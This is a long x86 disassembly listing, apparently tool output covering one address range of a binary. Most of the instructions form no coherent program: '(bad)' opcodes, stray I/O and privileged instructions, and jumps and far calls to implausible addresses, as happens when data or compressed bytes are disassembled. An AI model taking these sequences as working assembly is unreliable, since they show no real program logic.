  4365f1:	adc    DWORD PTR [edi-0x36],ecx
  4365f4:	adc    bh,BYTE PTR [ebp-0x67f3bba6]
  4365fa:	mov    ds:0x54285920,eax
  4365ff:	adc    ecx,DWORD PTR [eax]
  436601:	pop    eax
  436602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436603:	mov    bl,dh
  436605:	test   BYTE PTR [esi+0x4c],dl
  436608:	cmp    al,0x2a
  43660a:	jne    0x436612
  43660c:	ss mov gs,esi
  43660f:	push   edx
  436610:	dec    ebx
  436611:	jmp    0x19e94ac9
  436616:	add    bh,BYTE PTR [ebp+0x6a5416a2]
  43661c:	xchg   BYTE PTR [esi+eiz*1-0xfac55c6],dh
  436623:	ror    BYTE PTR [edi+0x18],cl
  436626:	fwait
  436627:	mov    ?,WORD PTR [esi+0x72d0ffdb]
  43662d:	mov    bh,0x80
  43662f:	and    esi,ecx
  436631:	mov    DWORD PTR [ecx+edx*8-0x56],edx
  436635:	mov    dh,ah
  436637:	sbb    BYTE PTR [eax-0x21],ch
  43663a:	fisub  WORD PTR [edi+0x53]
  43663d:	add    bh,dh
  43663f:	leave  
  436640:	add    al,0xf9
  436642:	sub    al,0xd2
  436644:	mov    ah,0x73
  436646:	cmp    DWORD PTR [eax-0x5a],0x6a06813a
  43664d:	or     DWORD PTR [edx+0x55],eax
  436650:	push   ecx
  436651:	dec    esi
  436652:	sahf   
  436653:	push   ebp
  436654:	or     WORD PTR [edx+0x60856a63],cx
  43665b:	dec    esp
  43665c:	hlt    
  43665d:	add    ah,BYTE PTR fs:[ebx-0x657def0]
  436664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436665:	push   ss
  436666:	adc    BYTE PTR [esi-0x5a],ch
  436669:	add    BYTE PTR [ebx-0x51c506b5],bl
  43666f:	xchg   esi,eax
  436670:	je     0x4366b6
  436672:	cld    
  436673:	hlt    
  436674:	xchg   ebx,eax
  436675:	add    dl,bl
  436677:	and    al,0x56
  436679:	nop    eax
  43667c:	add    dh,BYTE PTR [esi+0x14]
  43667f:	adc    BYTE PTR [esi+esi*8+0x63c7d20a],cl
  436686:	push   0xfffffff7
  436688:	push   es
  436689:	or     BYTE PTR [ecx],0x80
  43668c:	aas    
  43668d:	pop    ecx
  43668e:	pop    ds
  43668f:	mov    esi,0x35ce6036
  436694:	inc    ebp
  436695:	add    BYTE PTR [ebx],cl
  436697:	ins    DWORD PTR es:[edi],dx
  436698:	xchg   edi,eax
  436699:	push   esp
  43669a:	and    DWORD PTR [esi],0xbeb61602
  4366a0:	inc    esi
  4366a1:	std    
  4366a2:	fwait
  4366a3:	add    BYTE PTR [edx-0x6d],0x94
  4366a7:	les    ebx,FWORD PTR [edi]
  4366a9:	fsub   DWORD PTR [eax+0x16c0907a]
  4366af:	jl     0x43670a
  4366b1:	sub    dl,BYTE PTR [ebp-0x1d1bd594]
  4366b7:	punpcklbw mm5,DWORD PTR [edx+ebx*1+0x10]
  4366bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4366bd:	bswap  esp
  4366bf:	ins    BYTE PTR es:[edi],dx
  4366c0:	jg     0x436724
  4366c2:	adc    esp,edx
  4366c4:	arpl   WORD PTR [ebx],cx
  4366c6:	mov    ebx,fs
  4366c8:	mov    ds:0xed05b06a,eax
  4366cd:	pushf  
  4366ce:	sbb    ch,BYTE PTR [edx-0x8]
  4366d1:	ins    WORD PTR es:[edi],dx
  4366d3:	pop    edi
  4366d4:	out    dx,al
  4366d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4366d6:	add    DWORD PTR [ebx+ebp*1+0x455e0334],esi
  4366dd:	and    bl,BYTE PTR [eax+0x4dad05e2]
  4366e3:	rol    BYTE PTR [ecx-0x40],1
  4366e6:	push   eax
  4366e7:	ss add al,0x9a
  4366ea:	int    0xfa
  4366ec:	add    cl,ch
  4366ee:	pop    ss
  4366ef:	adc    al,0x2
  4366f1:	cmp    al,BYTE PTR [esi]
  4366f3:	inc    eax
  4366f4:	sub    DWORD PTR [edi-0x11af2b3b],esi
  4366fa:	in     al,dx
  4366fb:	fs inc ecx
  4366fd:	mov    al,ds:0xf8b60041
  436702:	adc    al,0xd1
  436704:	ss xor ebx,esp
  436707:	shl    BYTE PTR [edx-0x3c],1
  43670a:	retf   0x68ea
  43670d:	mov    es,WORD PTR ds:0x904828fa
  436713:	push   edx
  436714:	data16 js 0x436794
  436717:	pop    eax
  436718:	adc    cl,BYTE PTR [ecx]
  43671a:	test   al,0xba
  43671c:	mov    bh,BYTE PTR [eax+0x13d480c0]
  436722:	cmp    al,ah
  436724:	add    eax,0x8d71d522
  436729:	popf   
  43672a:	dec    esi
  43672b:	clc    
  43672c:	in     al,dx
  43672d:	jp     0x4366c1
  43672f:	mov    edx,0x5835b4c6
  436734:	mov    bl,0xd2
  436736:	loop   0x436790
  436738:	mov    dh,0xbb
  43673a:	push   0x24
  43673c:	das    
  43673d:	test   BYTE PTR [ecx-0x3b],ah
  436740:	xchg   edi,eax
  436741:	inc    esp
  436742:	sbb    eax,0x20a27aac
  436747:	add    eax,0x701bab1d
  43674c:	pop    ds
  43674d:	xchg   esi,eax
  43674e:	sub    BYTE PTR [edx+0xc9024d],al
  436754:	mov    ch,BYTE PTR [esi]
  436756:	int    0x8f
  436758:	nop
  436759:	ins    DWORD PTR es:[edi],dx
  43675a:	ins    BYTE PTR es:[edi],dx
  43675b:	and    cl,BYTE PTR [eax]
  43675d:	push   0xffffffa0
  43675f:	es ja  0x4367ac
  436762:	pop    eax
  436763:	shr    BYTE PTR [esi+0x7b7646ee],1
  436769:	add    BYTE PTR [eax],dh
  43676b:	mov    esi,0xed1d8081
  436770:	retf   0x8825
  436773:	(bad)  
  436774:	xchg   esi,eax
  436775:	pop    edx
  436776:	jmp    0x43676a
  436778:	dec    ebx
  436779:	dec    ebx
  43677a:	pop    ebp
  43677b:	ret    0x6c12
  43677e:	xor    ah,bh
  436780:	lods   eax,DWORD PTR ds:[esi]
  436781:	loope  0x43670e
  436783:	shl    BYTE PTR [edx],0x4
  436786:	cld    
  436787:	or     DWORD PTR [esi+eiz*8-0x1c9f9cde],esp
  43678e:	mov    eax,ds:0xd2c21bac
  436793:	rcl    BYTE PTR [ecx+eiz*2-0x4c],1
  436797:	je     0x4367d5
  436799:	mov    ebx,0x5dcc8e28
  43679e:	fldl2e 
  4367a0:	add    ch,BYTE PTR [edx+0x29]
  4367a3:	outs   dx,BYTE PTR ds:[esi]
  4367a4:	lahf   
  4367a5:	lods   eax,DWORD PTR ds:[esi]
  4367a6:	dec    ecx
  4367a7:	and    al,0xab
  4367a9:	(bad)  
  4367aa:	retf   
  4367ab:	sbb    dl,ah
  4367ad:	and    ah,BYTE PTR ds:[ebx]
  4367b0:	dec    edx
  4367b1:	(bad)  [ebp+0x5e2e4d8c]
  4367b7:	dec    esp
  4367b8:	lds    ecx,FWORD PTR [edi-0x2e3e969f]
  4367be:	mov    BYTE PTR [ebp+esi*8+0x72],0x14
  4367c3:	mov    bh,BYTE PTR [edx]
  4367c5:	push   ss
  4367c6:	fnstenv [esi-0x7a]
  4367c9:	outs   dx,DWORD PTR ds:[esi]
  4367ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4367cb:	fsqrt  
  4367cd:	jbe    0x4367af
  4367cf:	or     bh,BYTE PTR [ecx-0x52900ae2]
  4367d5:	ret    0x423a
  4367d8:	mov    edi,0xc4d552d6
  4367dd:	(bad)
  4367e0:	pop    ecx
  4367e1:	add    BYTE PTR [edx],ch
  4367e3:	cld    
  4367e4:	test   BYTE PTR [eax-0x6c4da0cb],dh
  4367ea:	add    edx,DWORD PTR [edx]
  4367ec:	jnp    0x4367a8
  4367ee:	push   esi
  4367ef:	add    bh,BYTE PTR [esp+ecx*2-0x6ef3b152]
  4367f6:	mov    WORD PTR [edi-0x2feb7a],cs
  4367fc:	add    dh,0x76
  4367ff:	and    dl,ah
  436801:	loopne 0x43687c
  436803:	cld    
  436804:	inc    esi
  436805:	xor    al,0x62
  436807:	xor    DWORD PTR [ecx+eiz*4-0x97d6e18],0x8074b57a
  436812:	iret   
  436813:	inc    eax
  436814:	cmp    eax,DWORD PTR [eax-0x9a96769]
  43681a:	pushf  
  43681b:	mov    ah,0xf
  43681d:	ret    0x8647
  436820:	sbb    BYTE PTR [eax+0x24],dl
  436823:	push   0xffffff9d
  436825:	lods   al,BYTE PTR ds:[esi]
  436826:	sbb    eax,0x24f0599a
  43682b:	add    dh,BYTE PTR [ecx+0x58966c84]
  436831:	inc    ebp
  436832:	pop    eax
  436833:	ror    DWORD PTR [edx-0x439b4dd6],1
  436839:	and    ebx,esp
  43683b:	fs push ss
  43683d:	mov    al,ds:0x5d56a4a4
  436842:	adc    cl,BYTE PTR [edx+0x4106cff]
  436848:	dec    esi
  436849:	jmp    0x3899e477
  43684e:	mov    ecx,0x42f42e74
  436853:	ror    BYTE PTR [esi+0x20a678ea],cl
  436859:	push   edx
  43685a:	jl     0x436888
  43685c:	mov    edx,0x56553584
  436861:	cwde   
  436862:	sbb    BYTE PTR [ecx+edx*4],ch
  436865:	or     BYTE PTR [edi+0xa],0x1b
  436869:	ficom  DWORD PTR [edi+0x7e6c1044]
  43686f:	pop    DWORD PTR [ecx-0x74]
  436872:	mov    dh,0xa3
  436874:	call   0x6ac3:0x1c5ce84a
  43687b:	pop    eax
  43687c:	ror    BYTE PTR [ebx],0x1a
  43687f:	into   
  436880:	fwait
  436881:	inc    ecx
  436882:	sbb    al,0x51
  436884:	aas    
  436885:	hlt    
  436886:	enter  0x5916,0x36
  43688a:	jl     0x436831
  43688c:	adc    bl,al
  43688e:	jp     0x436842
  436890:	mov    cl,0x75
  436892:	scas   al,BYTE PTR es:[edi]
  436893:	cmp    al,0x76
  436895:	sub    eax,DWORD PTR ds:0x7805334c
  43689b:	xor    ch,BYTE PTR [esi+esi*4]
  43689e:	dec    ecx
  43689f:	ret    
  4368a0:	clc    
  4368a1:	push   ss
  4368a2:	xor    DWORD PTR [eax+0x25],esi
  4368a5:	sbb    DWORD PTR [ebp-0xf],ecx
  4368a8:	add    eax,DWORD PTR [esi+0x77]
  4368ab:	cmp    eax,0x80b4d6d6
  4368b0:	inc    edi
  4368b1:	xor    DWORD PTR ds:0xb4a00cba,0x1697c0ef
  4368bb:	ss sbb edx,esp
  4368be:	les    esi,FWORD PTR [ecx+eax*4]
  4368c1:	xor    al,0x88
  4368c3:	aas    
  4368c4:	mov    al,ds:0x1312080a
  4368c9:	mov    fs,WORD PTR [ebx-0x6d72ef6b]
  4368cf:	inc    esp
  4368d0:	fcmovb st,st(0)
  4368d2:	pop    esi
  4368d3:	adc    al,0x88
  4368d5:	icebp  
  4368d6:	dec    esp
  4368d7:	aam    0x88
  4368d9:	fsub   QWORD PTR [edx+ebx*1]
  4368dc:	add    DWORD PTR [esi+0x6a40562d],0x84fbd735
  4368e6:	sahf   
  4368e7:	mov    ecx,0x5c7d0d9
  4368ec:	xchg   BYTE PTR [esi-0x6f70e97c],bh
  4368f2:	fdivrp st(1),st
  4368f4:	loop   0x436934
  4368f6:	shr    DWORD PTR [edx],0x2d
  4368f9:	add    BYTE PTR [ecx],bl
  4368fb:	sbb    eax,0x163f040
  436900:	pop    ds
  436901:	test   esi,esi
  436903:	call   0x47bdc7bf
  436908:	aam    0x82
  43690a:	xor    dh,0x36
  43690d:	add    eax,0x42e0ccc
  436912:	inc    ebp
  436913:	pop    eax
  436914:	pusha  
  436915:	pop    ebx
  436916:	imul   ebp,DWORD PTR [esi],0x6
  436919:	mov    BYTE PTR [esp+eax*1],bh
  43691c:	fwait
  43691d:	jae    0x4368fb
  43691f:	push   es
  436920:	enter  0x4762,0x73
  436924:	fcom   DWORD PTR [edx+0x6c]
  436927:	xchg   esi,eax
  436928:	adc    cl,BYTE PTR [edx]
  43692a:	out    0xc,al
  43692c:	mov    eax,ds:0x4b6bbcc1
  436931:	xchg   BYTE PTR [esi-0x7837ff0d],dh
  436937:	repnz (bad) 
  436939:	cli    
  43693a:	adc    al,0xc
  43693d:	mov    eax,0x74e9a659
  436942:	ins    BYTE PTR es:[edi],dx
  436943:	jne    0x4368d8
  436945:	inc    eax
  436946:	mov    esp,0x8e02b588
  43694b:	mov    bh,0x3a
  43694d:	shl    BYTE PTR [eax-0x10],0x7a
  436951:	xor    dl,BYTE PTR [esi]
  436953:	mov    ch,0x6b
  436955:	push   cs
  436956:	lock mov eax,0x46b3aa7a
  43695c:	push   cs
  43695d:	popf   
  43695e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43695f:	lahf   
  436960:	sbb    BYTE PTR [ecx+0x4230ca9a],dh
  436966:	inc    esp
  436967:	(bad)  [edx-0x36f12938]
  43696d:	sbb    al,0x6a
  43696f:	pop    ecx
  436970:	leavew 
  436972:	or     esi,edi
  436974:	pop    esp
  436975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436976:	or     bl,BYTE PTR [edx+0x53]
  436979:	fdivr  QWORD PTR [edx+eiz*8-0x60]
  43697d:	xor    eax,0xd8ea3e00
  436982:	or     bl,ah
  436984:	call   0xb30dcacb
  436989:	cdq    
  43698a:	add    BYTE PTR [esi],bh
  43698c:	retf   
  43698d:	or     al,0xea
  43698f:	add    edx,DWORD PTR [edx+0x18]
  436992:	push   eax
  436993:	xchg   DWORD PTR [edx+0x68],ebx
  436996:	jo     0x436946
  436998:	xchg   edx,eax
  436999:	push   esp
  43699a:	sahf   
  43699b:	in     al,0x1
  43699d:	push   0xffffff92
  43699f:	pop    edx
  4369a0:	jmp    0x436924
  4369a2:	in     eax,dx
  4369a3:	mov    al,ds:0x15b541fe
  4369a8:	in     eax,dx
  4369a9:	int3   
  4369aa:	test   al,0x46
  4369ac:	fidivr WORD PTR [esi-0x37f5d62d]
  4369b2:	xchg   DWORD PTR [esi-0x7b],eax
  4369b5:	cmp    eax,0xb40f2ee
  4369ba:	cld    
  4369bb:	cmp    al,0xe
  4369bd:	or     ebp,DWORD PTR [esi]
  4369bf:	inc    edx
  4369c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4369c1:	mov    esp,0x59a12d7a
  4369c6:	mov    esp,0x4d19fee7
  4369cb:	xor    DWORD PTR [esi+esi*8-0x20448127],esp
  4369d2:	lods   al,BYTE PTR ds:[esi]
  4369d3:	push   ecx
  4369d4:	inc    esi
  4369d5:	fwait
  4369d6:	js     0x436a39
  4369d8:	jecxz  0x436a03
  4369da:	adc    BYTE PTR [edx+0x6d],0xa3
  4369de:	pop    edx
  4369df:	sti    
  4369e0:	ss jle 0x436a1d
  4369e3:	sbb    BYTE PTR [esi+eiz*8+0x1c9140f8],bl
  4369ea:	sahf   
  4369eb:	sbb    ah,BYTE PTR [ecx+0x15d2aaa4]
  4369f1:	jo     0x436999
  4369f3:	lds    edi,FWORD PTR [ecx+ecx*4]
  4369f6:	jbe    0x5330ec3c
  4369fc:	fcomp  st(6)
  4369fe:	mov    edx,0xe86b9249
  436a03:	and    dh,dl
  436a05:	add    BYTE PTR [edi],ah
  436a07:	retf   0x3652
  436a0a:	xlat   BYTE PTR ds:[ebx]
  436a0b:	inc    ecx
  436a0c:	sbb    al,0xc2
  436a0e:	jbe    0x436a83
  436a10:	mov    ah,0x71
  436a12:	pop    ss
  436a13:	xchg   BYTE PTR [ebx-0x60],al
  436a16:	pusha  
  436a17:	clc    
  436a18:	cvtps2pd xmm1,QWORD PTR [edx+ebp*1-0x60]
  436a1d:	inc    esp
  436a1e:	test   al,0x5f
  436a20:	adc    al,0xda
  436a22:	mov    ah,0x9e
  436a24:	jl     0x4369bd
  436a26:	ret    0x349a
  436a29:	sbb    eax,0x8f4627c4
  436a2f:	mov    al,ds:0x152d9300
  436a34:	pop    edx
  436a35:	stos   DWORD PTR es:[edi],eax
  436a36:	mov    ss,WORD PTR [esi-0x7e]
  436a39:	push   esp
  436a3a:	mov    edx,0x9435b5b4
  436a3f:	cmc    
  436a40:	mov    gs,WORD PTR [edi+0x70621611]
  436a46:	and    al,0x61
  436a48:	sub    eax,edx
  436a4a:	inc    edx
  436a4b:	xchg   esp,eax
  436a4c:	inc    ecx
  436a4d:	and    eax,0x24d1239c
  436a52:	xor    al,0xd4
  436a54:	mov    esp,0x4ef436e0
  436a59:	adc    eax,0xee5b449f
  436a5e:	das    
  436a5f:	adc    eax,0x2e70ecc4
  436a64:	(bad)  
  436a65:	in     eax,0x43
  436a67:	loope  0x436a1c
  436a69:	mov    eax,ds:0xd0449ac3
  436a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436a6f:	lea    ecx,[esi-0x67]
  436a72:	test   BYTE PTR [esp+ecx*4],dl
  436a75:	adc    dl,dl
  436a77:	add    BYTE PTR [ebp-0x40],cl
  436a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436a7b:	and    ch,0x96
  436a7e:	imul   eax,DWORD PTR [edi+0x4],0xffffffb6
  436a82:	or     eax,esp
  436a84:	scas   eax,DWORD PTR es:[edi]
  436a85:	or     cl,BYTE PTR ds:0x6088a88a
  436a8b:	in     al,dx
  436a8c:	jb     0x436ad7
  436a8e:	out    0x56,al
  436a90:	cwde   
  436a91:	push   0xffffffb6
  436a93:	arpl   WORD PTR [ecx-0x71],dx
  436a96:	xor    BYTE PTR [eax+0x1c740e3a],0x22
  436a9d:	iret   
  436a9e:	inc    ebx
  436a9f:	add    DWORD PTR ds:0xfbf22294,esi
  436aa5:	mov    dh,0x55
  436aa7:	or     eax,0x4fc76984
  436aac:	rcr    dl,1
  436aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436aaf:	adc    bl,al
  436ab1:	stc    
  436ab2:	mov    ebx,DWORD PTR [esi+0x52]
  436ab5:	out    dx,al
  436ab6:	push   0x312014
  436abb:	xchg   ebx,eax
  436abc:	ins    DWORD PTR es:[edi],dx
  436abd:	add    bl,ch
  436abf:	jne    0x436b1b
  436ac1:	jp     0x436acc
  436ac3:	mov    eax,ds:0x3e18162c
  436ac8:	loope  0x436ae1
  436aca:	mov    al,0xe1
  436acc:	(bad)
  436ad0:	xchg   ebx,eax
  436ad1:	sbb    al,0x55
  436ad3:	jmp    0x436b13
  436ad5:	fstp   TBYTE PTR [edx+0x49]
  436ad8:	push   0x6c2ee4c3
  436add:	cmc    
  436ade:	xchg   DWORD PTR [ecx+0x2c52a087],ecx
  436ae4:	mov    dl,BYTE PTR [esi]
  436ae6:	push   ebp
  436ae7:	inc    edx
  436ae8:	adc    DWORD PTR [ebp-0x773b49cc],ecx
  436aee:	or     al,0x1d
  436af0:	shr    BYTE PTR [eax+0x10],1
  436af3:	add    eax,0x90bab86a
  436af8:	mov    al,0x40
  436afa:	lods   al,BYTE PTR ds:[esi]
  436afb:	xor    BYTE PTR [edx+eax*8+0x38],bh
  436aff:	cld    
  436b00:	sub    dh,BYTE PTR [esi]
  436b02:	call   0x71fe:0x8fdca011
  436b09:	cmp    dl,BYTE PTR [esi+0x5c]
  436b0c:	or     ecx,esi
  436b0e:	call   0x6ac3:0x48ce778e
  436b15:	push   ebp
  436b16:	dec    edi
  436b17:	mov    ah,0xb2
  436b19:	pop    eax
  436b1a:	push   es
  436b1b:	out    dx,al
  436b1c:	sub    bl,dh
  436b1e:	xor    al,0x99
  436b20:	jmp    0xee15:0x24e4c6a
  436b27:	mov    ds:0x6d7a937c,al
  436b2c:	cmp    al,0xd
  436b2e:	inc    eax
  436b2f:	inc    eax
  436b30:	dec    esi
  436b31:	ficom  DWORD PTR [edi+0x30fa0cd4]
  436b37:	inc    esp
  436b38:	cdq    
  436b39:	loop   0x436b1a
  436b3b:	rol    BYTE PTR [edi],cl
  436b3d:	inc    edx
  436b3e:	mov    edx,DWORD PTR [eax+0x31]
  436b41:	jb     0x436aed
  436b43:	mov    eax,es:0x93f1123d
  436b49:	ins    BYTE PTR es:[edi],dx
  436b4a:	mov    eax,ds:0x7509eac
  436b4f:	mov    cl,0x5d
  436b51:	add    BYTE PTR [ebp-0x449b6cc6],ch
  436b57:	ss (bad) 
  436b59:	mov    al,ds:0x48f596b0
  436b5e:	jmp    0x436b03
  436b60:	mov    al,0x12
  436b62:	fs jle 0x436b46
  436b65:	inc    ecx
  436b66:	mov    DWORD PTR [edx-0x712f99aa],ebp
  436b6c:	cmp    eax,0x3a24549c
  436b71:	xor    cl,cl
  436b73:	add    eax,0x4ca4dcca
  436b78:	pop    es
  436b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436b7a:	ds xchg edx,eax
  436b7c:	inc    eax
  436b7d:	stos   BYTE PTR es:[edi],al
  436b7e:	xchg   ebx,eax
  436b7f:	ins    BYTE PTR es:[edi],dx
  436b80:	pop    edx
  436b81:	push   eax
  436b82:	dec    DWORD PTR [eax+0x6d]
  436b85:	add    al,0x7
  436b87:	dec    edx
  436b88:	or     BYTE PTR [ebx],bh
  436b8a:	mov    cl,0x0
  436b8c:	mov    ds:0x8c2a0476,al
  436b91:	sub    esi,DWORD PTR [eax]
  436b93:	sub    dh,al
  436b95:	sbb    DWORD PTR [ecx],esp
  436b97:	xor    BYTE PTR [ecx],cl
  436b99:	pop    es
  436b9a:	cs clc 
  436b9c:	push   esi
  436b9d:	mov    dl,BYTE PTR [ebx]
  436b9f:	jp     0x436ba1
  436ba1:	enter  0xeca4,0x11
  436ba5:	out    0x80,al
  436ba7:	iret   
  436ba8:	xchg   esi,eax
  436ba9:	jle    0x436b47
  436bab:	push   esp
  436bac:	in     eax,0x78
  436bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436baf:	cdq    
  436bb0:	lock pusha 
  436bb2:	jmp    0x24b2fa48
  436bb7:	push   es
  436bb8:	adc    al,BYTE PTR [ebx+0x125ac91e]
  436bbe:	push   ss
  436bbf:	fst    st(2)
  436bc1:	xchg   ebp,eax
  436bc2:	mov    edi,0x6caa68fe
  436bc7:	lds    edi,FWORD PTR [ebp-0x4e]
  436bca:	gs push ebp
  436bcc:	inc    esi
  436bcd:	push   esp
  436bce:	js     0x436c3e
  436bd0:	and    eax,0x902d642e
  436bd5:	jle    0x436c3f
  436bd7:	outs   dx,BYTE PTR ds:[esi]
  436bd8:	repz fisub WORD PTR [ebx]
  436bdb:	lea    esp,[ebx]
  436bdd:	and    esp,esp
  436bdf:	inc    esi
  436be0:	adc    al,0xb6
  436be2:	or     ebp,ecx
  436be4:	mov    esi,0xdc020aa8
  436be9:	pusha  
  436bea:	jp     0x436bcd
  436bec:	and    eax,0x79560f89
  436bf1:	adc    DWORD PTR [esi],edx
  436bf3:	pop    esi
  436bf4:	dec    esi
  436bf5:	mov    ds:0x8865f6b6,al
  436bfa:	jns    0x436c66
  436bfc:	repz inc eax
  436bfe:	inc    ebx
  436bff:	mov    WORD PTR [ecx+0x1e171505],cs
  436c05:	jns    0x436c5f
  436c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436c08:	int3   
  436c09:	mov    ebp,0xe161f894
  436c0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436c0f:	sar    cl,0xed
  436c12:	sahf   
  436c13:	popf   
  436c14:	cs test eax,0x4a17b0d8
  436c1a:	dec    ebx
  436c1b:	push   ebx
  436c1c:	push   ss
  436c1d:	mov    al,0x4a
  436c1f:	lods   al,BYTE PTR ds:[esi]
  436c20:	push   es
  436c21:	or     ch,BYTE PTR [ebx-0x24]
  436c24:	bound  ebx,QWORD PTR [ebp+0x21]
  436c27:	jecxz  0x436c5c
  436c29:	push   ebp
  436c2a:	push   es
  436c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436c2c:	fdivr  st(5),st
  436c2e:	xor    DWORD PTR [edi],0x5b
  436c31:	imul   ebp,DWORD PTR [ebx+0x36],0x9a8ecbfa
  436c38:	cs push esi
  436c3a:	daa    
  436c3b:	add    BYTE PTR [ecx-0x1e6569db],ah
  436c41:	dec    ebx
  436c42:	in     al,0x26
  436c44:	inc    edi
  436c45:	add    DWORD PTR [ecx+0x2058402],ecx
  436c4b:	lods   eax,DWORD PTR ds:[esi]
  436c4c:	add    edi,DWORD PTR ss:[eax]
  436c4f:	push   eax
  436c50:	inc    edi
  436c51:	cmp    eax,DWORD PTR [esp+edi*8+0x5b507066]
  436c58:	stos   DWORD PTR es:[edi],eax
  436c59:	xor    ah,ch
  436c5b:	cli    
  436c5c:	in     eax,dx
  436c5d:	inc    eax
  436c5e:	push   ebx
  436c5f:	and    dh,al
  436c61:	xchg   ebx,eax
  436c62:	enter  0xa02a,0x7
  436c66:	loopne 0x436bf2
  436c68:	xchg   BYTE PTR [edi+0x6d4962be],ah
  436c6e:	mov    eax,ds:0x7872da0e
  436c73:	popa   
  436c74:	jmp    0x436c0b
  436c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436c77:	add    eax,0x56ee1842
  436c7c:	cmp    al,0x92
  436c7e:	cli    
  436c7f:	in     al,dx
  436c80:	sub    al,0x70
  436c82:	mov    dl,0x58
  436c84:	mov    dl,0x9a
  436c86:	add    ch,ah
  436c88:	fwait
  436c89:	mov    ah,0xb6
  436c8b:	sahf   
  436c8c:	jl     0x436ca5
  436c8e:	mov    BYTE PTR [eax],0xdc
  436c91:	or     dl,BYTE PTR [eax]
  436c93:	ins    DWORD PTR es:[edi],dx
  436c94:	sub    dh,dh
  436c96:	xchg   esi,eax
  436c97:	shl    DWORD PTR [edx+0x3ac9d012],0x40
  436c9e:	cmp    esi,edx
  436ca0:	pushf  
  436ca1:	pusha  
  436ca2:	cmp    al,BYTE PTR [esi+0x42]
  436ca5:	push   ebp
  436ca6:	mov    dh,0x10
  436ca8:	xor    al,0x1f
  436caa:	mov    al,al
  436cac:	test   BYTE PTR [edx+0x4d],bl
  436caf:	les    esi,FWORD PTR [ecx]
  436cb1:	mov    ebx,ss
  436cb3:	xor    BYTE PTR [ecx-0x66],dl
  436cb6:	imul   edi,DWORD PTR [ebp-0xbeef43a],0x6086e6d5
  436cc0:	and    eax,0x252f484f
  436cc5:	cmp    BYTE PTR [eax-0x4aebc15b],al
  436ccb:	lahf   
  436ccc:	aam    0x1d
  436cce:	mov    al,BYTE PTR [esi]
  436cd0:	jo     0x436cef
  436cd2:	jl     0x436cbd
  436cd4:	sahf   
  436cd5:	pop    esp
  436cd6:	mov    ebx,0xd8092d64
  436cdb:	idiv   BYTE PTR [ecx+0x2fda24a7]
  436ce1:	dec    eax
  436ce2:	test   al,0xb2
  436ce4:	and    BYTE PTR [esi],dl
  436ce6:	loop   0x436d58
  436ce8:	gs ins BYTE PTR es:[edi],dx
  436cea:	psubsb mm0,QWORD PTR [edx-0x5511b106]
  436cf1:	ins    BYTE PTR es:[edi],dx
  436cf2:	cs daa 
  436cf4:	add    BYTE PTR [ebp-0xb97bf3a],ah
  436cfa:	mov    eax,ds:0xf0838287
  436cff:	lds    ebx,FWORD PTR [esi+0x7914296]
  436d05:	shl    BYTE PTR [esi-0x4e],cl
  436d08:	aam    0xa
  436d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436d0b:	fist   DWORD PTR [eax-0x5c83df07]
  436d11:	or     eax,0xfcda0e6
  436d16:	mov    DWORD PTR [esi],eax
  436d18:	add    BYTE PTR [edi-0x5bd5fe6e],bh
  436d1e:	push   cs
  436d1f:	into   
  436d20:	jge    0x436cfa
  436d22:	add    al,BYTE PTR ds:0x18e2ada2
  436d28:	fadd   QWORD PTR es:[eax+edx*1-0x15fd0414]
  436d30:	lea    esp,[ebx+0x41]
  436d33:	pop    ds
  436d34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436d35:	mov    edi,DWORD PTR [edx-0x555357ab]
  436d3b:	push   0xd9d3c478
  436d40:	sbb    al,0x4a
  436d42:	into   
  436d43:	fsubr  QWORD PTR [esi]
  436d45:	fild   WORD PTR [eax]
  436d47:	push   0x1cc64113
  436d4c:	xor    cl,BYTE PTR [eax-0x5f85259]
  436d52:	fdiv   QWORD PTR [edi-0x252f03fb]
  436d58:	test   BYTE PTR [edx],bl
  436d5a:	lods   al,BYTE PTR ds:[esi]
  436d5b:	adc    dl,ah
  436d5d:	test   eax,esp
  436d5f:	cli    
  436d60:	or     dh,BYTE PTR [esi+eax*1+0x2a]
  436d64:	or     al,0x1d
  436d66:	xor    al,0xe8
  436d68:	inc    ecx
  436d69:	pop    esp
  436d6a:	mov    esi,0xd6c5440e
  436d6f:	aam    0x22
  436d71:	mov    edx,0x12949716
  436d76:	and    al,BYTE PTR [si-0x50]
  436d7a:	pop    ebp
  436d7b:	mov    al,ds:0x66b62c5e
  436d80:	jbe    0x436d64
  436d82:	fcomp  DWORD PTR [esi+esi*1]
  436d85:	fsub   QWORD PTR [eax+0x3ef69a3e]
  436d8b:	inc    edi
  436d8c:	cmp    BYTE PTR [esi+0x1a],0xfa
  436d90:	inc    eax
  436d91:	adc    BYTE PTR [esp+ebp*1+0x468b0163],dl
  436d98:	mov    al,0x8
  436d9a:	dec    edi
  436d9b:	(bad)  
  436d9c:	xchg   edx,eax
  436d9d:	add    BYTE PTR [edx-0x49],bl
  436da0:	lods   al,BYTE PTR ds:[esi]
  436da1:	out    dx,al
  436da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436da3:	pop    ebx
  436da4:	push   ss
  436da5:	pop    esi
  436da6:	push   0xffffffa3
  436da8:	loopne 0x436db4
  436daa:	hlt    
  436dab:	sub    BYTE PTR [eax],bl
  436dad:	je     0x436dab
  436daf:	sbb    dl,BYTE PTR [edx]
  436db1:	pop    ds
  436db2:	mov    WORD PTR [edi-0x23f667c0],?
